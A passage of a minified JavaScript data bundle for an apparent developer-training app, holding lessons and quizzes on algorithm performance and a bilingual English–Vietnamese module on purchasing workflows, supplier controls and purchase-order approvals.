orders.RemoveAll(o => ids.Contains(o.Id));`},choices:["A","B"],answer:1,why:"Each `Remove(item)` searches the list and shifts the items after it: O(n), done 10,000 times. `RemoveAll` makes one pass, and the HashSet check is O(1) on average."}]},{id:"performance.sorting-searching",title:"Sorting and searching",summary:"Sort once, search fast — never sort in a loop.",minutes:4,blocks:[{type:"text",text:"Sorting costs **O(n log n)**. That is good: 1 million items → about 20 million steps. Built-in sorts (`Array.prototype.sort`, `List<T>.Sort`, LINQ `OrderBy`) are already this fast. Do not write your own."},{type:"text",text:"Once data is sorted, you can use **binary search**: look at the middle, throw away half, repeat. **O(log n)**."},{type:"diagram",text:`find 37 in sorted data (16 items)

[3 8 12 15 21 26 30 33 37 41 45 50 58 62 70 81]
                    ▲ mid 33 → 37 is bigger, go right
[37 41 45 50 58 62 70 81]
          ▲ mid 50 → 37 is smaller, go left
[37 41 45]
    ▲ mid 41 → go left
[37] → found in 4 steps (a simple loop needs 9)`},{type:"compare",left:{title:"Sort once, search many ✅",items:["Sort: O(n log n), one time","Each search: O(log n)","Good when data rarely changes"]},right:{title:"Sort inside a loop ⚠️",items:["Each sort: O(n log n)","Done n times → worse than O(n²)","Common bug: `OrderBy` inside a `foreach`"]}},{type:"text",text:'For exact matches ("find id 42"), a Dictionary or Set is usually simpler than sort + binary search. Sorted data wins when you need **ranges** ("all orders from 10:00 to 11:00") or the **top N**.'},{type:"example",title:"You already use this",text:"A database index is sorted (a B-tree). `WHERE CreatedAt BETWEEN ...` jumps to the first match in O(log n), then reads forward. Same idea as binary search."}],remember:"Sort once, then search fast. Never sort inside a loop.",questions:[{id:"performance.sorting-searching.1",kind:"perf",difficulty:"hard",prompt:"There are 20,000 products and 300,000 offers. This code is very slow. What is the main cost?",code:{lang:"csharp",text:`foreach (var p in products)
{
    var cheapest = offers
        .Where(o => o.ProductId == p.Id)
        .OrderBy(o => o.Price)
        .FirstOrDefault();
    p.BestOffer = cheapest;
}`},choices:["`OrderBy`, because sorting is always slow","`FirstOrDefault` returning null too often","`Where` scans all 300,000 offers for each product","The `foreach` over 20,000 products itself"],answer:2,why:"20,000 × 300,000 = 6 billion checks. Each sort only sees the few offers of one product. Group the offers once (for example `GroupBy` + `ToDictionary` by ProductId), then look each product up.",remember:"Group once, look up many times."},{id:"performance.sorting-searching.2",kind:"debug",difficulty:"medium",prompt:"A teammate calls `List<User>.BinarySearch` with an **email** comparer. The list is sorted by **name**. Results look random: sometimes found, sometimes not. Why?",choices:["`BinarySearch` only works on numbers","The list is too big for binary search","The list is not sorted by the key being searched","Emails contain the @ character"],answer:2,why:'Binary search decides "go left or right" based on order. If the list is not sorted by email, it throws away the wrong half. So it misses items that are really there.',remember:"Binary search needs data sorted by the same key."},{id:"performance.sorting-searching.3",kind:"scenario",difficulty:"medium",prompt:'You hold 1 million log entries in memory, sorted by time. Users ask for "everything between 10:00 and 10:05". Which approach is efficient?',choices:["Binary search for 10:00, then read forward until 10:05","Scan every entry and check its time","Put entries in a HashSet and call `Contains`","Sort the entries again before each request"],answer:0,why:"Binary search finds the start in ~20 steps, then you read only the matching entries. A HashSet cannot answer range questions, and re-sorting already sorted data is wasted work."}]},{id:"performance.space",title:"Space complexity and memory trade-offs",summary:"Paying memory to buy speed — on purpose.",minutes:4,blocks:[{type:"text",text:"**Space complexity** = how much **extra memory** your code needs as the data grows. It uses the same Big-O letters: O(1) extra memory, O(n) extra memory, and so on."},{type:"diagram",text:`Find duplicates in n ids

A) nested loops   time O(n²)   extra memory O(1)
B) HashSet        time O(n)    extra memory O(n)

You "pay" memory to "buy" speed.`},{type:"text",text:"This trade is usually worth it: a `HashSet` of 1 million ints takes only tens of MB. But memory is not free. Watch for these:"},{type:"list",items:["**Loading everything**: `ToListAsync()` on 10 million rows puts all of them in RAM. Instead, stream them (one row at a time) or read them in pages.","**Copies**: `.ToList()`, `.ToArray()`, `[...arr]`, `.map()` each make a new O(n) copy. Fine once, costly in a loop that runs very often.","**Caches without limits**: a static Dictionary that only grows is a memory leak. Give it a size limit or an expiry time.","**Deep recursion**: each call uses stack space. Too deep → stack overflow."]},{type:"code",code:{lang:"csharp",text:`// ❌ All 10M rows in memory at once
var rows = await db.Events.ToListAsync();
foreach (var e in rows) Write(e);

// ✅ One row at a time (streaming)
await foreach (var e in db.Events.AsNoTracking().AsAsyncEnumerable())
    Write(e);`}},{type:"example",title:"Real world",text:'A "cache every product forever" Dictionary worked fine for a year. Then the catalog grew to 3 million items. Pods started restarting with OutOfMemory. A cache with a size limit and expiry (for example `MemoryCache` with `SizeLimit`) fixed it.'}],remember:"Speed often costs memory. Make that trade on purpose, and put a limit on anything that grows.",questions:[{id:"performance.space.1",kind:"compare",difficulty:"medium",prompt:"A batch job must find duplicate ids among 50 million ids. The server has plenty of RAM. Which approach?",choices:["Nested loops: O(n²) time, O(1) memory","HashSet: O(n) time, O(n) memory"],answer:1,why:"(50 million)² checks would take far too long. The HashSet needs memory, but the server has it. If memory were low, sort first and compare neighbours: O(n log n) time, little extra memory."},{id:"performance.space.2",kind:"debug",difficulty:"medium",prompt:"An API's memory grows slowly all week and drops only when the pod restarts. You find `static Dictionary<string, Report> _cache` that stores every report ever requested and never removes anything. What is the problem?",choices:["Dictionary lookups leak memory by design","Static fields are cleared after each request","A cache with no limit that only grows","String keys use too much CPU"],answer:2,why:"A static field lives as long as the app. Every new report key adds memory that is never freed. Add a size limit and/or expiry, or use `MemoryCache`.",remember:"Every cache needs a limit."},{id:"performance.space.3",kind:"perf",difficulty:"easy",prompt:"A nightly export loads 8 million rows with `ToListAsync()`, then writes them to a file. It crashes with `OutOfMemoryException`. What is the best fix?",choices:["Add more RAM to the server every time the data grows","Call `GC.Collect()` right after loading to free memory","Convert the list to an array first, since arrays use less memory","Stream the rows (or read in pages) and write them one by one"],answer:3,why:"The job never needs all rows at once. Streaming keeps memory use the same, whether there are 8 million rows or 80 million. More RAM only delays the next crash."},{id:"performance.space.4",kind:"code",difficulty:"medium",prompt:"How much **extra memory** does this use, as `nums` grows?",code:{lang:"ts",text:`const doubled = nums.map(n => n * 2);
const big = doubled.filter(n => n > 100);
return big.length;`},choices:["O(1) — it only returns one number","O(n) — `map` and `filter` create new arrays","O(n²) — it makes two passes","O(log n) — `filter` drops some items"],answer:1,why:"`map` builds a new array of n items, and `filter` builds another one. Two passes is still O(n) time, not O(n²). A single loop with a counter would need only O(1) extra memory."}]},{id:"performance.measure",title:"Measure before optimizing",summary:"Big-O shows what might be slow. Measuring shows what is slow.",minutes:4,blocks:[{type:"text",text:"Big-O tells you what **might** become slow. Only **measuring** tells you what **is** slow. Guessing is often wrong."},{type:"diagram",text:`One API request (850 ms total)

DB query        ███████████████████████  800 ms
JSON serialize  █                         20 ms
Other           █                         28 ms
Your loop       ▏                          2 ms

→ Making the loop 5× faster saves ~1.6 ms.
→ Fix the DB query first.`},{type:"list",items:["Browser DevTools → **Performance** and **Network** tabs","`console.time()` / `performance.now()` in JS, `Stopwatch` in C# for quick checks","**BenchmarkDotNet** for fair micro-benchmarks in .NET (it runs the code a few times first: the **warm-up**)","A **profiler** (Visual Studio, dotTrace, PerfView) to see where time really goes","**Tracing / APM** (app performance monitoring) in production (OpenTelemetry, Application Insights)"]},{type:"list",items:["Measure with **production-sized data**. 100 test rows hide O(n²).","Fix the **biggest** cost first. Usually it is I/O: database, network, disk.","Measure again after the change. Keep it only if it really helped."]},{type:"text",text:'Big-O ignores the cost of each step. Take a loop over 50 items that makes an HTTP call for each item. It is O(n), but it is much slower than an O(n²) loop over 50 items in memory. Use both: Big-O for "what happens when data grows", measuring for "what hurts now".'}],remember:"Measure, fix the biggest thing, measure again.",questions:[{id:"performance.measure.1",kind:"scenario",difficulty:"easy",prompt:'A page feels slow. A teammate wants to rewrite every `map().filter()` chain into hand-written `for` loops "for speed". What should happen first?',choices:["Rewrite all the chains in the codebase","Switch to a faster frontend framework","Profile the page to see where time goes","Add caching to every function"],answer:2,why:"Without measuring, you may optimize code that takes 1% of the time. A profile shows whether the problem is rendering, network, a big loop, or something else."},{id:"performance.measure.2",kind:"perf",difficulty:"medium",prompt:"A trace of a 1.2 s request shows three parts. Database: 1,050 ms. JSON: 40 ms. An in-memory sort of 300 items: 3 ms. Where do you start?",choices:["The database query and its execution plan","Replace the sort with a faster algorithm","Switch to a faster JSON serializer","Add more web servers"],answer:0,why:"The database is ~88% of the time. Even a perfect sort saves 3 ms. More servers do not make one slow query faster.",remember:"Optimize the biggest bar first."},{id:"performance.measure.3",kind:"compare",difficulty:"hard",prompt:"Two versions process 40 items. **A** is O(n): one HTTP call per item, ~50 ms each. **B** is O(n²): 1,600 cheap in-memory checks, then one batched HTTP call. Which is faster in practice?",choices:["A — lower Big-O always wins","B — one network call beats 40 calls"],answer:1,why:"A waits about 40 × 50 ms = 2 seconds. B does 1,600 checks in microseconds, plus one 50 ms call. Big-O ignores the cost per step, and I/O is very expensive. (If n grew to millions, B's O(n²) would hurt. Keep both in mind.)"},{id:"performance.measure.4",kind:"mcq",difficulty:"medium",prompt:"You time a C# method once with `Stopwatch`: 120 ms. You run it again in the same process: 4 ms. What is the most likely reason?",choices:["The OS moved the second run to a faster core","Warm-up: JIT compiling, cold caches, opening connections","Stopwatch is not accurate below one second","The garbage collector speeds up code it has seen"],answer:1,why:"The first call pays one-time costs. The JIT compiles the method, caches are cold (still empty), and connections are opened. Measure many runs, or use BenchmarkDotNet, which does warm-up for you.",remember:"Never trust a single timing."}]}],cheatSheet:[{title:"Big-O at a glance (n = 1,000,000)",items:[{term:"O(1)",meaning:"Same work at any size — dict[key], arr[i], Set.has · 1 step"},{term:"O(log n)",meaning:"Halve each step — binary search, index lookup · ~20 steps"},{term:"O(n)",meaning:"One pass — loop, includes, Contains, Find · 1M steps"},{term:"O(n log n)",meaning:"Good sort — Sort, OrderBy · ~20M steps"},{term:"O(n²)",meaning:"Loop in a loop over the same data · 10¹² steps ❌"},{term:"O(n × m)",meaning:"Loop over A, search all of B inside"},{term:"Space",meaning:"Extra memory as data grows — Set/Dictionary/copies = O(n)"}]},{title:"Warning signs in code",items:[{term:"includes / Contains in a loop",meaning:"Build a Set / HashSet once"},{term:"find / Find / First(pred) in a loop",meaning:"Build a Map / Dictionary once"},{term:"Count() / ElementAt() on a query in a loop",meaning:"Use foreach, or call ToList() once"},{term:"string += in a loop (C#)",meaning:"Use StringBuilder or string.Join"},{term:"Sort / OrderBy inside a loop",meaning:"Sort once, outside the loop"},{term:"shift() / Insert(0, x) / Remove(item) in a loop",meaning:"O(n) each — use an index, a Queue, or RemoveAll"},{term:"ToList() on millions of rows",meaning:"Stream or page instead"},{term:"Cache that only grows",meaning:"Memory leak — add a size limit or expiry"}]},{title:"Habits",items:[{term:"Measure first",meaning:"Profiler or trace before rewriting anything"},{term:"Production-sized data",meaning:"Small test data hides O(n²)"},{term:"Biggest cost first",meaning:"Usually I/O: database, network, disk"},{term:"Constants matter",meaning:"O(n) with an HTTP call per item can lose to O(n²) in memory"},{term:"Single timing",meaning:"Includes warm-up — run many times or use BenchmarkDotNet"},{term:"Memory for speed",meaning:"Set / Dictionary cost memory, save huge amounts of time"}]}]},ie=Object.freeze(Object.defineProperty({__proto__:null,default:ae},Symbol.toStringTag,{value:"Module"})),se={id:"purchasing",group:"domain",title:"Purchasing",emoji:"🧾",tagline:`Buy the right thing, at the right price, at the right time.
VI: Mua đúng hàng, đúng giá, đúng lúc.`,lessons:[{id:"purchasing.p2p",title:"Procure to pay · Từ mua hàng đến thanh toán",summary:`The six steps from "we need it" to "we paid for it".
VI: Sáu bước từ "cần mua" đến "đã trả tiền".`,minutes:4,blocks:[{type:"text",text:`**Procure to pay** (P2P) is the full buying flow. It starts when someone needs something. It ends when the supplier is paid.
VI: **Procure to pay** (P2P) là toàn bộ quy trình mua hàng. Nó bắt đầu khi có người cần hàng và kết thúc khi đã trả tiền cho nhà cung cấp.`},{type:"diagram",text:`┌──────────────────┐
│ Purchase request │ Đề nghị mua hàng
└────────┬─────────┘
         ▼
┌──────────────────┐
│ RFQ / Quotation  │ Yêu cầu báo giá
└────────┬─────────┘
         ▼
┌──────────────────┐
│ Purchase order   │ Đơn đặt hàng
└────────┬─────────┘
         ▼
┌──────────────────┐
│ Goods receipt    │ Phiếu nhập kho
└────────┬─────────┘
         ▼
┌──────────────────┐
│ Supplier invoice │ Hóa đơn nhà cung cấp
└────────┬─────────┘
         ▼
┌──────────────────┐
│ Payment          │ Thanh toán
└──────────────────┘`},{type:"list",items:[`Purchase request (PR): an internal ask. "The warehouse needs 500 boxes."
VI: Đề nghị mua hàng: yêu cầu nội bộ. "Kho cần 500 thùng carton."`,`RFQ (request for quotation): we ask suppliers for a price.
VI: Yêu cầu báo giá: hỏi giá các nhà cung cấp.`,`Purchase order (PO): our official order to one supplier.
VI: Đơn đặt hàng: lệnh mua chính thức gửi một nhà cung cấp.`,`Goods receipt (GR): the warehouse records what really arrived.
VI: Phiếu nhập kho: kho ghi nhận số hàng thực nhận.`,`Supplier invoice: the bill. In Vietnam it is usually an e-invoice.
VI: Hóa đơn nhà cung cấp: thường là hóa đơn điện tử.`,`Payment: money leaves our bank account, often by bank transfer.
VI: Thanh toán: tiền ra khỏi tài khoản công ty, thường là chuyển khoản.`]},{type:"example",title:"Buying 500 carton boxes",text:`The warehouse runs low on boxes and creates a PR. Purchasing asks three suppliers for prices. The best one gets a PO. The boxes arrive and the warehouse posts a goods receipt. The invoice comes, accounting checks it and pays.
VI: Kho sắp hết thùng carton nên lập đề nghị mua hàng. Phòng mua hàng hỏi giá ba nhà cung cấp. Bên tốt nhất nhận đơn đặt hàng. Hàng về, kho lập phiếu nhập kho. Hóa đơn đến, kế toán kiểm tra rồi thanh toán.`},{type:"text",text:`IT side: each step is usually its own **document**, with its own table and status. Each document links to the one before it.
VI: Góc IT: mỗi bước thường là một **chứng từ** riêng, có bảng và trạng thái riêng. Mỗi chứng từ liên kết với chứng từ trước nó.`},{type:"diagram",text:`PurchaseRequest  Id, Status
   │ one PR → one or more POs
PurchaseOrder    Id, PrId, SupplierId
   │ one PO → many receipts
GoodsReceipt     Id, PoId, ReceivedAt
   │
SupplierInvoice  Id, PoId, InvoiceNo
   │ one invoice → many payments
Payment          Id, InvoiceId, Amount`},{type:"text",text:`Ask the business: is a PR always needed, or can small buys skip it? Can we pay before the goods arrive?
VI: Hỏi nghiệp vụ: có luôn cần đề nghị mua hàng không, hay mua nhỏ được bỏ qua? Có được trả tiền trước khi hàng về không?`}],remember:`Need → ask price → order → receive → bill → pay. Each step is a document linked to the last one.
VI: Cần → hỏi giá → đặt hàng → nhận hàng → hóa đơn → trả tiền. Mỗi bước là một chứng từ nối với bước trước.`,questions:[{id:"purchasing.p2p.1",kind:"mcq",difficulty:"easy",prompt:`Which document is our official, approved order sent to one supplier?
VI: Chứng từ nào là lệnh mua chính thức, đã duyệt, gửi cho một nhà cung cấp?`,choices:["Purchase request","Purchase order","Goods receipt","Supplier quotation"],answer:1,why:`A purchase order is the official order to a supplier. A purchase request is only an internal ask and is not sent out.
VI: Đơn đặt hàng là lệnh mua chính thức gửi nhà cung cấp. Đề nghị mua hàng chỉ là yêu cầu nội bộ, không gửi ra ngoài.`},{id:"purchasing.p2p.2",kind:"scenario",difficulty:"medium",prompt:`An invoice arrives for 200 chairs. There is a PO for 200 chairs, but no goods receipt yet. What should happen?
VI: Hóa đơn 200 cái ghế đã đến. Có đơn đặt hàng 200 ghế nhưng chưa có phiếu nhập kho. Nên làm gì?`,choices:["Pay it now, because the PO matches the invoice","Record it, but hold payment until goods arrive","Reject the invoice and cancel the whole PO","Create a goods receipt from the invoice data"],answer:1,why:`Nobody has confirmed that the chairs arrived. So you record the invoice but hold the payment. Creating a receipt from the invoice hides the problem.
VI: Chưa ai xác nhận ghế đã về. Vì vậy ghi nhận hóa đơn nhưng tạm giữ thanh toán. Tạo phiếu nhập từ hóa đơn chỉ che giấu vấn đề.`},{id:"purchasing.p2p.3",kind:"truefalse",difficulty:"easy",prompt:`In most purchasing systems, one purchase order can have several goods receipts.
VI: Trong hầu hết hệ thống mua hàng, một đơn đặt hàng có thể có nhiều phiếu nhập kho.`,choices:["True","False"],answer:0,why:`Suppliers often deliver in parts. So the design should allow many receipts for one PO, not a single "received" flag.
VI: Nhà cung cấp thường giao nhiều đợt. Vì vậy thiết kế phải cho phép nhiều phiếu nhập cho một đơn, không chỉ một cờ "đã nhận".`},{id:"purchasing.p2p.4",kind:"debug",difficulty:"medium",prompt:`Some purchase orders show status "Received", but stock did not go up. What is the most likely cause?
VI: Một số đơn đặt hàng có trạng thái "Đã nhận" nhưng tồn kho không tăng. Nguyên nhân khả năng cao nhất là gì?`,choices:["Users can set the PO status by hand, with no receipt","The supplier sent the invoice in another currency","The purchase request was approved by the wrong person","The PO uses a supplier that has no bank account"],answer:0,why:`Stock should change only when a goods receipt is posted. If users can just change the PO status, status and stock disagree.
VI: Tồn kho chỉ nên thay đổi khi phiếu nhập kho được ghi sổ. Nếu người dùng tự đổi trạng thái đơn, trạng thái và tồn kho sẽ lệch nhau.`}]},{id:"purchasing.suppliers",title:"Suppliers and quotations · Nhà cung cấp và báo giá",summary:`Who we buy from, and how we pick the best offer.
VI: Mua của ai, và chọn báo giá tốt nhất thế nào.`,minutes:4,blocks:[{type:"text",text:`The **supplier master** is the main record of each supplier. Every PO, invoice and payment points to it.
VI: **Danh mục nhà cung cấp** là hồ sơ gốc của từng nhà cung cấp. Mọi đơn đặt hàng, hóa đơn và thanh toán đều trỏ về nó.`},{type:"diagram",text:`Supplier (Nhà cung cấp)
┌───────────────┬────────────────────┐
│ Code          │ NCC-0012           │
│ Name          │ Minh Phat Packing  │
│ Tax code (MST)│ 0101234567         │
│ Bank account  │ 0123 4567 89       │
│ Payment terms │ Net 30             │
│ Currency      │ VND                │
│ Status        │ Active             │
└───────────────┴────────────────────┘`},{type:"text",text:`The **tax code** (mã số thuế, MST) identifies the company. **Payment terms** say when we must pay. For example, "Net 30" means 30 days after the invoice.
VI: **Mã số thuế** (MST) xác định doanh nghiệp. **Điều khoản thanh toán** cho biết khi nào phải trả. Ví dụ, "Net 30" là trả trong 30 ngày kể từ hóa đơn.`},{type:"text",text:`An **RFQ** (request for quotation) asks several suppliers for a price. Then we compare the quotations side by side.
VI: **Yêu cầu báo giá** gửi tới nhiều nhà cung cấp để hỏi giá. Sau đó so sánh các báo giá cạnh nhau.`},{type:"diagram",text:`Item: 500 carton boxes
┌──────────┬────────┬──────┬────────┐
│ Supplier │ Price  │ Lead │ Defect │
│          │ /box   │ time │ rate   │
├──────────┼────────┼──────┼────────┤
│ A        │ 8,000  │ 3 d  │ 1%     │
│ B        │ 7,200  │ 14 d │ 6%     │
│ C        │ 7,800  │ 5 d  │ 1%     │
└──────────┴────────┴──────┴────────┘
Cheapest = B. Best overall = often C.`},{type:"example",title:"The cheapest is not always the best",text:`Supplier B is 10% cheaper than A. But B takes two weeks and has many defects. If the packing line stops for a day, the saving is gone. Many teams pick C.
VI: Nhà cung cấp B rẻ hơn A 10%. Nhưng B giao mất hai tuần và nhiều hàng lỗi. Nếu dây chuyền đóng gói dừng một ngày, khoản tiết kiệm mất hết. Nhiều nơi chọn C.`},{type:"text",text:`An **approved vendor list** (AVL) says which suppliers passed our checks for an item. The system should block a PO to a supplier not on the list.
VI: **Danh sách nhà cung cấp được duyệt** cho biết ai đã qua đánh giá cho từng mặt hàng. Hệ thống nên chặn đơn đặt hàng gửi nhà cung cấp ngoài danh sách.`},{type:"list",items:[`Check for a duplicate tax code on create. Two records for one supplier split spending and debt.
VI: Kiểm tra trùng mã số thuế khi tạo mới. Hai hồ sơ cho một nhà cung cấp làm tách rời số mua và công nợ.`,`A bank account change is a classic fraud trick. Require a second person to approve it.
VI: Đổi số tài khoản ngân hàng là chiêu gian lận quen thuộc. Bắt buộc người thứ hai phê duyệt.`,`Never delete a supplier with history. Set its status to Inactive or Blocked.
VI: Không xóa nhà cung cấp đã có giao dịch. Chuyển trạng thái sang Ngừng dùng hoặc Bị chặn.`,`A quotation has a valid-until date. An expired price must not flow into a new PO.
VI: Báo giá có ngày hết hiệu lực. Giá đã hết hạn không được đưa vào đơn mới.`,`Ask the business: can one company have branches with their own tax codes?
VI: Hỏi nghiệp vụ: một công ty có chi nhánh với mã số thuế riêng không?`]}],remember:`Pick suppliers by total value, not price only. Guard the supplier master: tax code, bank account, terms.
VI: Chọn nhà cung cấp theo giá trị tổng thể, không chỉ theo giá. Bảo vệ danh mục nhà cung cấp: mã số thuế, tài khoản, điều khoản.`,questions:[{id:"purchasing.suppliers.1",kind:"compare",difficulty:"medium",prompt:`If this part is missing, the production line stops. Which quotation is usually better?
VI: Nếu thiếu linh kiện này, dây chuyền sản xuất phải dừng. Báo giá nào thường tốt hơn?`,choices:["A: 100,000 VND, 30-day lead time, 5% defects","B: 106,000 VND, 5-day lead time, 0.5% defects","Always A, because price is the only fair rule","Always the supplier who answers the RFQ first"],answer:1,why:`A line stop costs far more than 6% of the part price. For critical parts, short lead time and few defects matter most.
VI: Dừng dây chuyền tốn hơn nhiều so với 6% giá linh kiện. Với linh kiện quan trọng, thời gian giao ngắn và ít lỗi là quan trọng nhất.`},{id:"purchasing.suppliers.2",kind:"scenario",difficulty:"hard",prompt:`A user edits a supplier. Only the bank account number changes. Next week a large payment goes to that account. Which control was missing?
VI: Một người dùng sửa nhà cung cấp, chỉ đổi số tài khoản ngân hàng. Tuần sau một khoản lớn được chuyển vào tài khoản đó. Thiếu kiểm soát nào?`,choices:["Second approval and a call-back for bank changes","A unique index on the supplier name column","A maximum length for the supplier address","A rule that each PO has only one line"],answer:0,why:`Changing bank details is a common fraud. A second approver and a call to a known phone number stop most of it. Keep an audit log too.
VI: Đổi thông tin ngân hàng là kiểu gian lận phổ biến. Người duyệt thứ hai và cuộc gọi xác minh qua số điện thoại đã biết chặn được phần lớn. Cũng cần lưu nhật ký thay đổi.`},{id:"purchasing.suppliers.3",kind:"truefalse",difficulty:"easy",prompt:`When we stop working with a supplier, the best practice is to delete its record.
VI: Khi ngừng làm việc với một nhà cung cấp, cách tốt nhất là xóa hồ sơ của họ.`,choices:["True","False"],answer:1,why:`Old POs, invoices and payments point to that supplier. Deleting it breaks history and reports. Set it to Inactive instead.
VI: Các đơn hàng, hóa đơn và thanh toán cũ đều trỏ tới nhà cung cấp đó. Xóa sẽ làm hỏng lịch sử và báo cáo. Hãy chuyển sang Ngừng dùng.`},{id:"purchasing.suppliers.4",kind:"debug",difficulty:"medium",prompt:`A spending report shows "Minh Phat" on two lines with almost the same name. What is the most likely cause?
VI: Báo cáo chi mua hàng hiện "Minh Phat" trên hai dòng với tên gần giống nhau. Nguyên nhân khả năng cao nhất là gì?`,choices:["Two supplier records exist for one tax code","The report rounds amounts to the nearest thousand","Some POs were approved by different managers","The supplier changed its payment terms last month"],answer:0,why:`The supplier was created twice. A duplicate tax code check on create would stop this.
VI: Nhà cung cấp bị tạo hai lần. Kiểm tra trùng mã số thuế khi tạo mới sẽ chặn được lỗi này.`}]},{id:"purchasing.orders",title:"Purchase orders and approvals · Đơn đặt hàng và phê duyệt",summary:`PO lines, who approves which amount, and changes after approval.
VI: Dòng đơn hàng, ai duyệt mức tiền nào, và sửa đơn sau khi duyệt.`,minutes:5,blocks:[{type:"text",text:`A PO has a **header** (supplier, date, currency, terms) and **lines** (item, quantity, unit price). The total is calculated from the lines.
VI: Đơn đặt hàng có **phần đầu** (nhà cung cấp, ngày, loại tiền, điều khoản) và **các dòng** (mặt hàng, số lượng, đơn giá). Tổng tiền được tính từ các dòng.`},{type:"code",code:{lang:"sql",text:`-- Header: one row per PO
CREATE TABLE PurchaseOrder (
  Id         INT PRIMARY KEY,
  SupplierId INT NOT NULL,
  Currency   CHAR(3) NOT NULL,   -- VND, USD
  ExchRate   DECIMAL(18,6) NOT NULL,
  Status     VARCHAR(20) NOT NULL,
  Revision   INT NOT NULL DEFAULT 0
);
-- Lines: many rows per PO
CREATE TABLE PurchaseOrderLine (
  PoId        INT NOT NULL,
  LineNum     INT NOT NULL,
  ItemId      INT NOT NULL,
  OrderedQty  DECIMAL(18,3) NOT NULL,
  ReceivedQty DECIMAL(18,3) NOT NULL,
  UnitPrice   DECIMAL(18,4) NOT NULL,
  PRIMARY KEY (PoId, LineNum)
);`}},{type:"text",text:`The **approval limit** decides who must approve a PO. Compare it with the total in VND, the company's own currency. Otherwise a 50,000 USD order looks "small".
VI: **Hạn mức phê duyệt** quyết định ai phải duyệt đơn. So sánh với tổng tiền quy ra VND, đồng tiền hạch toán của công ty. Nếu không, đơn 50.000 USD trông như đơn "nhỏ".`},{type:"diagram",text:`Approval limits (example)
┌─────────────────────┬──────────────────┐
│ PO total (VND)      │ Approver         │
├─────────────────────┼──────────────────┤
│ up to 20 million    │ Team lead        │
│ up to 200 million   │ Purchasing mgr   │
│ up to 1 billion     │ Director         │
│ over 1 billion      │ CEO              │
└─────────────────────┴──────────────────┘

Draft → Pending approval → Approved → Sent
  ▲            │ rejected
  └────────────┘
Sent → Partially received → Received
     → Closed     (any open PO → Cancelled)`},{type:"example",title:"Changing a PO after approval",text:`A PO for 100 units at 50,000 VND was approved. Now the supplier asks 58,000 VND. The buyer edits the price. The system saves a new revision and sends it back for approval.
VI: Đơn 100 cái giá 50.000 VND đã được duyệt. Giờ nhà cung cấp đòi 58.000 VND. Người mua sửa giá. Hệ thống lưu phiên bản mới và gửi duyệt lại.`},{type:"text",text:`Imports: the PO is in USD, but the books are in VND. Store the currency and the rate used. The rate on payment day can differ, which creates an exchange gain or loss.
VI: Hàng nhập khẩu: đơn đặt hàng bằng USD nhưng sổ sách ghi bằng VND. Lưu loại tiền và tỷ giá đã dùng. Tỷ giá ngày thanh toán có thể khác, tạo ra chênh lệch tỷ giá.`},{type:"list",items:[`Is the limit checked on the total before or after VAT?
VI: Hạn mức tính trên tổng tiền trước hay sau thuế GTGT?`,`Which changes need a new approval: higher price, more quantity, new line, new date?
VI: Thay đổi nào cần duyệt lại: tăng giá, tăng số lượng, thêm dòng, đổi ngày giao?`,`Should the system warn when one big order is split into small POs?
VI: Hệ thống có cần cảnh báo khi một đơn lớn bị chia thành nhiều đơn nhỏ không?`,`For imports: which exchange rate do we store, and from which date?
VI: Với hàng nhập khẩu: lưu tỷ giá nào, lấy theo ngày nào?`]}],remember:`Approve by the amount in VND. Any change that costs more goes back for approval.
VI: Duyệt theo số tiền quy ra VND. Thay đổi nào làm tăng tiền thì phải duyệt lại.`,questions:[{id:"purchasing.orders.1",kind:"scenario",difficulty:"medium",prompt:`A manager can approve up to 200 million VND. A buyer creates four POs of 190 million each, same supplier, same day. What should the system do?
VI: Trưởng phòng được duyệt tới 200 triệu VND. Người mua tạo bốn đơn, mỗi đơn 190 triệu, cùng nhà cung cấp, cùng ngày. Hệ thống nên làm gì?`,choices:["Approve all four, because each one is under the limit","Flag them as a possible split order for review","Merge them into one PO without asking anyone","Block the supplier for the rest of the month"],answer:1,why:`Splitting an order to stay under a limit is a known trick. The system should flag it, so a higher approver can review it.
VI: Chia nhỏ đơn để lọt dưới hạn mức là chiêu quen thuộc. Hệ thống nên đánh dấu để cấp duyệt cao hơn xem xét.`},{id:"purchasing.orders.2",kind:"debug",difficulty:"hard",prompt:`A 30,000 USD PO was approved by a team lead whose limit is 20 million VND. What is the most likely bug?
VI: Đơn 30.000 USD được một trưởng nhóm có hạn mức 20 triệu VND duyệt. Lỗi khả năng cao nhất là gì?`,choices:["The check used the USD number, not the VND value","The team lead has two user accounts in the system","The PO lines were saved in the wrong order","The supplier tax code was missing on the PO"],answer:0,why:`The code compared 30,000 with 20,000,000 and saw a small number. Always convert to VND before checking the limit.
VI: Code so sánh 30.000 với 20.000.000 nên thấy là số nhỏ. Luôn quy đổi ra VND trước khi kiểm tra hạn mức.`},{id:"purchasing.orders.3",kind:"truefalse",difficulty:"medium",prompt:`A PO is already approved. The buyer may now raise the unit price without a new approval, if they add a note.
VI: Sau khi đơn được duyệt, người mua được tăng đơn giá mà không cần duyệt lại, miễn là có ghi chú.`,choices:["True","False"],answer:1,why:`A higher price changes what the approver agreed to. It should create a new revision that goes back for approval.
VI: Tăng giá làm thay đổi điều người duyệt đã đồng ý. Phải tạo phiên bản mới và gửi duyệt lại.`},{id:"purchasing.orders.4",kind:"code",difficulty:"medium",prompt:`A PO totals 10,000 USD. The example rate is 25,000 VND per USD. Who must approve it?
VI: Đơn hàng tổng 10.000 USD. Tỷ giá ví dụ là 25.000 VND/USD. Ai phải duyệt?`,code:{lang:"ts",text:`function approver(totalVnd: number): string {
  if (totalVnd <= 20_000_000) return 'TeamLead';
  if (totalVnd <= 200_000_000) return 'Manager';
  if (totalVnd <= 1_000_000_000) return 'Director';
  return 'CEO';
}
const po = { total: 10_000, rate: 25_000 };
approver(po.total * po.rate);`},choices:["TeamLead","Manager","Director","CEO"],answer:2,why:`10,000 × 25,000 = 250 million VND. That is over 200 million and under 1 billion, so the Director approves.
VI: 10.000 × 25.000 = 250 triệu VND. Số này trên 200 triệu và dưới 1 tỷ, nên Giám đốc duyệt.`}]},{id:"purchasing.receipt",title:"Goods receipt and partial delivery · Nhập kho và giao hàng từng phần",summary:`Count what arrived, check quality, then add it to stock.
VI: Đếm hàng thực nhận, kiểm tra chất lượng, rồi mới nhập kho.`,minutes:5,blocks:[{type:"text",text:`A **goods receipt** (GR, phiếu nhập kho) records what really arrived. It may differ from the PO. Stock goes up only when the receipt is posted.
VI: **Phiếu nhập kho** ghi nhận số hàng thực sự đã về. Số này có thể khác đơn đặt hàng. Tồn kho chỉ tăng khi phiếu nhập được ghi sổ.`},{type:"diagram",text:`PO line: 1,000 bottles ordered

Delivery 1   ████████████░░░░░░░░  600
